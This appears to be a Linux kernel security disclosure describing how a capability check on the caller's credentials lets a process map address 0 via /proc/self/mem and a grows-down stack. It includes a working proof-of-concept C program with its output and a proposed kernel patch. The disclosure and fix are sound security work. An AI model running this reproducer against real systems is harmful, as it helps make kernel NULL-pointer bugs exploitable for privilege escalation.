@@ -1,0 +1,112 @@
+By following the codepath that Andrea Arcangeli pointed out in his mails
+regarding the last bug I reported, I noticed that it is possible for userspace
+on a normal distro to map virtual address 0, which on an X86 system without SMAP
+enables the exploitation of kernel NULL pointer dereferences.
+
+The problem is in the following code path:
+
+mem_write -> mem_rw -> access_remote_vm -> __access_remote_vm
+-> get_user_pages_remote -> __get_user_pages_locked -> __get_user_pages
+-> find_extend_vma
+
+Then, if the VMA in question has the VM_GROWSDOWN flag set:
+expand_stack -> expand_downwards -> security_mmap_addr -> cap_mmap_addr
+
+This, if the address is below dac_mmap_min_addr, does a capability check:
+
+        ret = cap_capable(current_cred(), &init_user_ns, CAP_SYS_RAWIO,
+                          SECURITY_CAP_AUDIT);
+
+But this check is performed against current_cred(), which are the creds of the
+task doing the write(), not the creds of the task whose VMA is being changed.
+
+
+To reproduce:
+
+===============================================================
+user@deb10:~/stackexpand$ cat nullmap.c 
+#include <sys/mman.h>
+#include <err.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <fcntl.h>
+
+int main(void) {
+  void *map = mmap((void*)0x10000, 0x1000, PROT_READ|PROT_WRITE,
+                   MAP_PRIVATE|MAP_ANONYMOUS|MAP_GROWSDOWN|MAP_FIXED, -1, 0);
+  if (map == MAP_FAILED) err(1, "mmap");
+  int fd = open("/proc/self/mem", O_RDWR);
+  if (fd == -1) err(1, "open");
+  unsigned long addr = (unsigned long)map;
+  while (addr != 0) {
+    addr -= 0x1000;
+    if (lseek(fd, addr, SEEK_SET) == -1) err(1, "lseek");
+    char cmd[1000];
+    sprintf(cmd, "LD_DEBUG=help su 1>&%d", fd);
+    system(cmd);
+  }
+  system("head -n1 /proc/$PPID/maps");
+  printf("data at NULL: 0x%lx\n", *(unsigned long *)0);
+}
+user@deb10:~/stackexpand$ gcc -o nullmap nullmap.c && ./nullmap 
+00000000-00011000 rw-p 00000000 00:00 0 
+data at NULL: 0x706f2064696c6156
+user@deb10:~/stackexpand$ 
+===============================================================
+
+
+I would like it if we could just get rid of the "you can map NULL if you're
+root" thing, but we probably don't want to unconditionally do that as a
+backported fix.
+Is there any chance that someone is legitimately using a stack that grows down
+and is located in the restricted address space range? Does DOSEMU rely on stack
+expansion? If not, maybe we could just change expand_downwards() to always
+reject expansion below dac_mmap_min_addr no matter who you are?
+A quick grep for "GROWSDOWN" in the DOSEMU sources has no results...
+
+So, how about this patch? (Copy attached with proper indent.)
+
+===============================================================
+From a237de4f41ccddf9c31935c68af4589735c8348d Mon Sep 17 00:00:00 2001
+From: Jann Horn <jannh@google.com>
+Date: Wed, 27 Feb 2019 21:29:52 +0100
+Subject: [PATCH] mm: enforce min addr even if capable() in expand_downwards()
+
+security_mmap_addr() does a capability check with current_cred(), but we
+can reach this code from contexts like a VFS write handler where
+current_cred() must not be used.
+
+This can be abused on systems without SMAP to make NULL pointer
+dereferences exploitable again.
+
+Fixes: 8869477a49c3 ("security: protect from stack expantion into low vm addresses")
+Cc: stable@kernel.org
+Signed-off-by: Jann Horn <jannh@google.com>
+---
+ mm/mmap.c | 7 +++----
+ 1 file changed, 3 insertions(+), 4 deletions(-)
+
+diff --git a/mm/mmap.c b/mm/mmap.c
+index f901065c4c64..fc1809b1bed6 100644
+--- a/mm/mmap.c
++++ b/mm/mmap.c
+@@ -2426,12 +2426,11 @@ int expand_downwards(struct vm_area_struct *vma,
+ {
+  struct mm_struct *mm = vma->vm_mm;
+  struct vm_area_struct *prev;
+- int error;
++ int error = 0;
+ 
+  address &= PAGE_MASK;
+- error = security_mmap_addr(address);
+- if (error)
+-   return error;
++ if (address < mmap_min_addr)
++   return -EPERM;
+ 
+  /* Enforce stack_guard_gap */
+  prev = vma->vm_prev;
+-- 
+2.21.0.rc2.261.ga7da99ff1b-goog
+===============================================================
